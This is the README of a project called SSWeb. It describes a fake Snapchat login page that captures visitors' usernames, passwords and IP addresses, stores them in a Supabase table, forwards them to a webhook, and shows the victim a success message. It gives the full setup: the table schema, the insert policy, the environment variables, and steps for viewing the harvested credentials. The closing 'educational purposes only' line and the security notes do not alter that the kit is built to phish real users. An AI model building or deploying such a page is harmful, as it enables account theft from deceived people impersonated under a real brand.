# SSWeb - Snapchat Login Page with Supabase Integration

A submission page for collecting user credentials with Supabase database integration.

## Features
- User credential collection (username/password)
- IP address tracking
- Supabase database storage
- Webhook integration
- Clean, responsive UI

## Prerequisites
- Node.js 18.x (recommended)
- npm or yarn
- Supabase account

## Supabase Setup

### 1. Create a Supabase Project
1. Go to [https://supabase.com](https://supabase.com) and sign up/login
2. Click "New Project"
3. Fill in your project details and create the project

### 2. Create the Database Table
In your Supabase project dashboard, go to the SQL Editor and run this SQL:

```sql
-- Create the user_credentials table
CREATE TABLE user_credentials (
  id BIGSERIAL PRIMARY KEY,
  username TEXT NOT NULL,
  password TEXT NOT NULL,
  ip_address TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Enable Row Level Security (optional, for security)
ALTER TABLE user_credentials ENABLE ROW LEVEL SECURITY;

-- Create a policy to allow inserts (adjust as needed)
CREATE POLICY "Enable insert for all users" ON user_credentials
  FOR INSERT WITH CHECK (true);

-- Create a policy to allow select for authenticated users (optional)
CREATE POLICY "Enable read for authenticated users" ON user_credentials
  FOR SELECT USING (auth.role() = 'authenticated');
```

### 3. Get Your Supabase Credentials
1. In your Supabase project dashboard, go to Settings → API
2. Copy your **Project URL** (looks like: `https://xxxxx.supabase.co`)
3. Copy your **anon/public key** (the `anon` key)

### 4. Configure Environment Variables
1. Copy `.env.example` to `.env`:
   ```powershell
   Copy-Item .env.example .env
   ```

2. Edit `.env` and add your Supabase credentials:
   ```env
   SUPABASE_URL=https://your-project.supabase.co
   SUPABASE_ANON_KEY=your-anon-key-here
   PORT=3000
   ```

## Installation

```powershell
# Install dependencies
npm install
```

## Running the Application

```powershell
# Start the server
npm start
```

The application will be available at: **http://localhost:3000**

## How It Works

1. User enters username and password in the login form
2. On submit, the data is sent to `/api/submit` endpoint
3. Server captures the user's IP address
4. Data (username, password, IP address, timestamp) is stored in Supabase
5. Data is also sent to the configured webhook (optional)
6. Success message is displayed to the user

## Project Structure

```
SSWeb/
├── index.html          # Main HTML page with login form
├── style.css           # Styling for the page
├── script.js           # Client-side JavaScript
├── server.js           # Express server with Supabase integration
├── package.json        # Node.js dependencies
├── .env                # Environment variables (not in git)
├── .env.example        # Environment variables template
└── README.md           # This file
```

## API Endpoints

### POST `/api/submit`
Stores user credentials in Supabase.

**Request Body:**
```json
{
  "username": "user@example.com",
  "password": "password123"
}
```

**Response (Success):**
```json
{
  "success": true,
  "message": "Data stored successfully"
}
```

**Response (Error):**
```json
{
  "success": false,
  "error": "Error message here"
}
```

## Viewing Stored Data

To view the data stored in Supabase:
1. Go to your Supabase project dashboard
2. Click on "Table Editor" in the sidebar
3. Select the `user_credentials` table
4. You'll see all submitted credentials with timestamps and IP addresses

## Security Notes

⚠️ **Important Security Considerations:**
- This application stores passwords in plain text - DO NOT use in production
- For production use, implement proper password hashing (bcrypt, argon2)
- Add rate limiting to prevent abuse
- Implement CAPTCHA to prevent automated submissions
- Use HTTPS in production
- Add input validation and sanitization
- Consider adding authentication for viewing stored data
- Review and adjust Row Level Security policies in Supabase

## Dependencies

- `express` - Web server framework
- `@supabase/supabase-js` - Supabase client library
- `dotenv` - Environment variable management
- `cors` - CORS middleware
- `node-webhooks` - Webhook functionality

## Troubleshooting

### Server won't start
- Check that all environment variables in `.env` are set correctly
- Ensure port 3000 is not already in use
- Verify Node.js version (18.x recommended)

### Data not saving to Supabase
- Verify your `SUPABASE_URL` and `SUPABASE_ANON_KEY` are correct
- Check that the `user_credentials` table exists in your Supabase project
- Review Row Level Security policies in Supabase
- Check server console for error messages

### Can't connect to Supabase
- Ensure you have an active internet connection
- Verify your Supabase project is active
- Check Supabase service status

## License

This project is for educational purposes only.
